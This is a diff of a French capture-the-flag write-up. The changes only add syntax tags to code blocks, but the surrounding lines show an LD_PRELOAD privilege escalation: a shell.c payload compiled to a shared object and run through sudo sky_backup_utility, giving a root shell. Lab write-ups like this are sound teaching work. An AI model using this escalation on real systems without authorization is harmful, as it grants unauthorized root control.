@@ -209,7 +209,7 @@ Il peux executer **/usr/bin/sky_backup_utility**.
 
 **sky_backup_utility** est un bin Linux. On va le reverse avec Ghidra.
 *Je passe par Ghidra pour la science, un simple cat sur ce fichier affiche ce qu'il nous faut pour deviner ce que ce petit programme fait*
-```
+```cpp
 bool main(void)
 
 {
@@ -236,7 +236,7 @@ On va test une autre approche.
 Comme a on pu voir sur le résultat de la commande **sudo -l**, dans **secure_path** on retrouve **env_keep+=LD_PRELOAD**
 
 On va donc test de créer un fichier **shell.c** qui contient ce code :
-```
+```cpp
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
@@ -249,11 +249,11 @@ void _init() {
 }
 ```
 Ensuite, on le compile en fichier **.so**:
-```
+```sh
 gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 ```
 Puis, on l'execute :
-```
+```sh
 webdeveloper@sky:~$ sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
 root@sky:/home/webdeveloper# id
 uid=0(root) gid=0(root) groups=0(root)
